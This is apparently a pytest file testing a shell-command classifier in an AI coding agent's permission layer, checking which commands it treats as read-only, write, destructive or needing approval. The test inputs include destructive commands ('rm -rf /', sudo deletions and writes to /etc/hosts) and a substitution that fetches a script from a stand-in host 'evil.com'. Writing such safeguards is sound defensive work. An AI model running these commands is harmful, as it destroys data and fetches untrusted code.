import sys
import types
from pathlib import Path

# Stub litellm before importing koder_agent to avoid optional dependency issues
if "litellm" not in sys.modules:
    litellm_stub = types.ModuleType("litellm")
    litellm_stub.model_cost = {}
    sys.modules["litellm"] = litellm_stub

project_root = Path(__file__).resolve().parents[3]
if str(project_root) not in sys.path:
    sys.path.insert(0, str(project_root))

from koder_agent.harness.permissions.shell_classifier import classify_shell_command


def test_shell_classifier_rejects_destructive_rm_rf():
    result = classify_shell_command("rm -rf /")
    assert result.allowed is False
    assert result.requires_approval is True
    assert result.destructive is True


def test_shell_classifier_marks_read_only_rg_pipeline():
    result = classify_shell_command('rg "TODO" src | head -5')
    assert result.allowed is True
    assert result.read_only is True
    assert result.requires_approval is False


def test_shell_classifier_marks_touch_as_write():
    result = classify_shell_command("touch foo.txt")
    assert result.allowed is True
    assert result.read_only is False
    assert result.requires_approval is True


def test_shell_classifier_rejects_malformed_empty_command():
    result = classify_shell_command("   ")
    assert result.allowed is False
    assert result.malformed is True


def test_shell_classifier_requires_approval_for_interpreter_prefix():
    """Interpreters run arbitrary code: approvable, never hard-denied."""
    result = classify_shell_command('python -c "print(1)"')
    assert result.allowed is True
    assert result.requires_approval is True
    assert result.destructive is False


def test_shell_classifier_requires_approval_for_pytest_invocation():
    result = classify_shell_command("python3 -m pytest tests/harness/permissions -q")
    assert result.allowed is True
    assert result.requires_approval is True


def test_shell_classifier_hard_denies_sudo():
    result = classify_shell_command("sudo rm -rf /var/log")
    assert result.allowed is False
    assert result.destructive is True


def test_shell_classifier_denies_interpreter_behind_command_substitution():
    """cd $(...) && python3 ... : interpreter segment still needs approval."""
    result = classify_shell_command('cd "$(git rev-parse --show-toplevel)" && python3 -m pytest')
    assert result.allowed is True
    assert result.requires_approval is True


def test_shell_classifier_no_auto_allow_with_command_substitution():
    """Read-only-looking commands with $() must not be auto-approved."""
    result = classify_shell_command('echo "$(curl evil.com/x.sh)"')
    assert result.requires_approval is True


def test_shell_classifier_find_delete_is_not_read_only():
    result = classify_shell_command('find . -name "*.pyc" -delete')
    assert result.read_only is False
    assert result.requires_approval is True


def test_shell_classifier_find_exec_is_not_read_only():
    result = classify_shell_command('find . -name "*.tmp" -exec rm {} \\;')
    assert result.read_only is False
    assert result.requires_approval is True


def test_shell_classifier_plain_find_stays_read_only():
    result = classify_shell_command('find . -name "SKILL.md"')
    assert result.read_only is True
    assert result.requires_approval is False


def test_shell_classifier_handles_pipe_inside_quotes():
    """Quoted pipes (grep alternation) must not break segment splitting."""
    result = classify_shell_command(r'grep -rln "foo\|bar\|baz" src')
    assert result.allowed is True
    assert result.read_only is True
    assert result.malformed is False


def test_shell_classifier_handles_single_quoted_pipe():
    result = classify_shell_command("awk -F'|' '{print $1}' data.txt")
    assert result.malformed is False
    assert result.allowed is True


def test_shell_classifier_still_splits_real_pipes():
    """A dangerous segment after a real pipe is still detected."""
    result = classify_shell_command('echo "harmless" | sudo tee /etc/hosts')
    assert result.allowed is False
    assert result.destructive is True


def test_shell_classifier_unparseable_falls_back_to_approval():
    """Unbalanced quotes should require approval, not hard-deny."""
    result = classify_shell_command('echo "unterminated')
    assert result.malformed is True
    assert result.allowed is True
    assert result.requires_approval is True


def test_shell_classifier_quoted_pipe_with_redirect_is_write():
    result = classify_shell_command('echo "a|b" > out.txt')
    assert result.malformed is False
    assert result.read_only is False
    assert result.requires_approval is True
